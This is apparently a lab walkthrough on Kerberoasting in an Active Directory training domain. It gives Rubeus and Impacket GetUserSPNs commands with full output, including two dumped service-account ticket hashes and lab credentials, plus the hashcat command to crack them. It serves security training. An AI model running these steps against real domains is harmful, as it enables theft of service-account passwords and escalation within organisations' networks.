In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.

I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.

### Method 1. Kerberoasting with Rubeus

**Useage**

1. `Rubeus.exe kerberoast` Dumps the Kerberos hash of and kerberoastable users

```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM 
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$71EB3D98612665B4BDEEBBBDB132EB3B$13ECA3BCD149C59D110FC5FB68E4B9607EAAA7 
                             939594245D7C4CC393174D313AF7BCAAF8D362C562543DFA355DF910A2682FF347C46C3BF10D520D       
                             D72F9C06C192DA88D9EEAF6543C5AA930FFA6F8F354259774BE098CCDA296D581F1D9EFB0772CE9B       
                             3A636231E7235D411FB50AFEA675E48688F0A963C1AADC19F1DB2FF17E599AC54476BAFD3F171AD1       
                             8D36FB37E1EDA2A26ED606922633E53D720780936DD5079C34CFE08BC9F71280E58811854D734418       
                             88D19E6CEBD7B672E5443F1A7BB7E9B2828BB5229B383612DB7AC18C860129D58744016FE5AF3E26       
                             EB483CA25F3685DF22EF0D3B6ED1D3AC4D1D330DD040819E10B15D945659828D3351653940D45D1B       
                             39DE33BDBCCF97E8A16F7C802164CAAA37442241FA9BB90D1D185DF3A42A4E2DB6A92A337B33AFAC       
                             A52E2FDA8B74B7AF3B0DE0AF1CF943AE76FFF67F735FEC24442762B04ED4CE8A8AEBB4BBB440A66D       
                             17A5E3D284F0B3154C61058CE60A390637CDED3B5DD6482CAE58E57995934356EE9CCBF4518D126A       
                             1496A984DEAECD6980EAC78AD22127E3675FD2B7B190344325B4E35E9564CE9334F172C6570B967A       
                             9EC1312A16CFB04CF5A282631836F06D8EAE6E685E851F2300F48B1753C991B16C2FC66B5331F95B       
                             7B82A37AD17B454F32B893595016D40282CE636C281416124523195ED034D4B5A6C450366FC712B4       
                             5F4DF472CC1DC22E21C9F8769CA2CEB4165BB5F5E4A50438F57F7100088181E710F0CB0C4A68F80F       
                             14C0BD10387265B9A9CC9AA6A2479F135948E5D47A82FC82F01C68A2A6E79DE1946CB1286A4BB43C       
                             7FE2F3814EA2BE188FA26E2C24EACCCA53836B37F3BBDBD9C4AB4D40D3CEEAC516565DDC7820EF65       
                             6CA0AA2CD0BEFD893188AC93507C238D976FD509CCD7B17D4340CA5B239825B7AC265A673630A74C       
                             132FC7DFCF67C1A019DD59DDDF1EC7E079B0FED11494EC0B3BF4DC3B6DEA641A4BE92B26835301A9       
                             8800664B0DC90437FFA4C89EB07BA101E5B12A08C15D7661A1CEC550A3E46DA67453933B19B6C5FC       
                             47147CD8D3E0F63CCA2FBA5646D8669F017332223FC0A0CBB3AC2BA9DCCA36DA91CACACFFBBA8A3C       
                             AAA20C793E4CCFB42FDB3F322A7DA327BE4CCAD168B6CEFCF1DC4CF006C8624CA980782B45D993DF       
                             C2B4154C2D73012D9F1936D65944C94270E35A5411A4033144EB1BE5AAB2D75AC1A5D5FD17740EC2       
                             1F67B319D923F4C147216610345A3388FE70E1A9D2E4F3A6B5CDC51CD34BD93100A9C6428C340832       
                             FBB2FA446CE48510BABCCDAB10F444B31877F9D04765C932C53D133E6ECB9B118896AA0823A7526E       
                             7203A6C987F1F92064107FF0CFEF85A9779D51D729F19569BA74649580C14200DCC0E596129D143B       
                             FDDFEFB65D1659B85EB2915ECEE8BF1515DE6E7172FD6616534C13AD312A6F93CA69A6977E75D923       
                             769EAA402BD5093F4872E51D8675A4961E37EA756BC920CD587A57EE5A10D8F03682FE0562B3A5BC       
                             58CF82362F9AB07B00191F52B7BE463228BC0FBB1D85C50B53F0F5600C36860E5AE124DD42EE2923       
                             E4AAF6A1F5180F63B5E2A6EEE6D1CDBC183E3E4C297A8D4AD95BAAE1AFBBE8A4C87B733DB202B524       
                             251EB78F22039F5A207D8A8FF8EF6639087B5C9B47CAF0A3DF688075E9


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo       
                             cal:30222*$82159D47C0796C9751F32916D1B8DFE9$B887A7DDFC8B7BB4FA85317E0EAA3ADC0738       
                             151DD6F9A81EE59C5B4B5B0C87B92525B59C9BBF465B346E1CFBDA1E452B12BC086DCB78E670DE24       
                             B172BED57FA541325188E7F1C0D67C1BF0776C9508B860FA940DBAC9887AA1FBADD28C5E63413C92       
                             2890F2F4A43DED59A97EB9C5686DDC32C8BF5C87DD298D6A487C1617F3F7B8091ADF9892043052AA       
                             AC0DD90659B8218D086E0323CCAC9E8C23576F7F08BCFE4AE391D96245376D9447B08D0082712855       
                             9C9D49CB8178521BA090CEA52CACD2CDE2DB77F4EBD9B5569C5435BE9013F4AA179FFF666EABF1FC       
                             4804732A2FE6D81151B4C4511A878D6BD9ED82575BD8669C9A59C34D94DACA26834DF59C629FE4F9       
                             03BC6EEC9EEABD3787234296D63A3F6E7BAA7CB8DCD31BCBA6BAFDFA781676FFDAFBCD384DC73D2D       
                             AACBB2EBD0FAE99E0AAE07A61C7E8F0174D7414ADAFF26619F79AE51A328820B3CBCDD014143F85E       
                             779B46FCDA4484C2DDF82A1E2A1AEE42207859B7461527591AB77178A5E8E1402832CC5911BB2CBD       
                             571F21CEAF7BEB6F277C17C8E88C651BECA38B619E77109F4619187BED9CCB14CA06B8806C461A77       
                             DB439D0E407727218BEF08971A29E3214FEB1D35338D88E246F4098A0472F40DC066F507E267492C       
                             1FB94CE8951F0C67CFD4C67BAA5DF91ED73D7F6D3494B015241C080AAB9D3BC892367C2755DB85AD       
                             AD5B9D824ACCB1DCD8446D2A0F83C46562B95FF2EF553D34E550D191A7CA9C71DADB283E3D3F5806       
                             2C8EE9199A7C61C4FE3D6437EA7DE7D05E967BF7ADF939C276FF93F7DB95B9BBD567E665CB0CC349       
                             3E03F7F836C0E04A22B7DEB4BB56F16B2969037DC9A5145DC002E685A5493F2406AA2B421FD18AFD       
                             09C0B2E3342A6A580899132167E0C6BC7115C07DFA66B5389D416D662D7EDF22C2FFBD4634C82CF7       
                             883C11A4F3EE650D22BACB0138D3399B1BAC49103D4C4C548DA34BD6178935E1B64ACEE73F4FE317       
                             761A294D6FF6EA91E2CABC3C11E4DC5A9A0FA441A7C4BE21BC12E09FCCA6AD12599BF4006C665528       
                             988E803C87415588377F6D22B55452DA64AE8BF02FE25FB90BBACD5B053D4C47491E18560681A6A0       
                             36937E73176E2E0AA4137E220A8426240F2801BAE3464349C2AABABCB35308A93C9610BDCA4A5886       
                             B41D06CECFE464A9A735762D6772AAD04ECB6E6DBC2CF329DB3D29996EADD0DE7CB6A8AFA7FBE9A3       
                             EE9F8C8C74480791AF967F8EFC00A59DD07F4A3E7742A2FC98C708134C80DD785E9E95A6085B3EF3       
                             C494FB3D7BB181A6678A43C478A6D43CAE80D46918502364E42880795935D90AE96F17D390AA51A4       
                             B04D7D2105E972B161A58EAB4ED7DDE726A7167E081F5D5166AD0D031B4CE5E767922DB5E19CF9E0       
                             C554E00D5CF7BAD12A26D6B24C8C6DC99B46B391D1B7177289F685A97542975EDADD6D51B7D96C75       
                             927B737ECF008CCEEF6AE35CC09F497718723FD377D216AEDFD091502000D1301DCF2F37CE5C8555       
                             70E6DF319446B721F0614648446EA0CA0C3E0369684909DC1C48126566AE879CB92A3A6EF6357139       
                             727A151479D976D019043DDD863E37E26EF5F34E4DCF010309B6FB94C14EB0323054DD027A7C4465       
                             4C1839218C90F109A528987DA61C57BB5DAF89794E15DE98EC4A5AA419AB


```
copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
: `hashcat -m 13100 -a 0 hash.txt Pass.txt`

- `-m 13100` to set the mode
- `-a 0`
- `hash.txt` path to hash file
- `Pass.txt` path to password list, this lab provides a much shorter RockYou list, saved as Pass.txt


2. 

### Method 2. Kerberoadsting with impacket

Method 2 - Impacket

**Impacket Installation**  

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

1.) cd /opt navigate to your preferred directory to save tools in 

2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19

3.) cd Impacket-0.9.19 navigate to the impacket directory

4.) pip install . - this will install all needed dependencies

Kerberoasting w/ Impacket - 

1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located

2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.20.101 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash


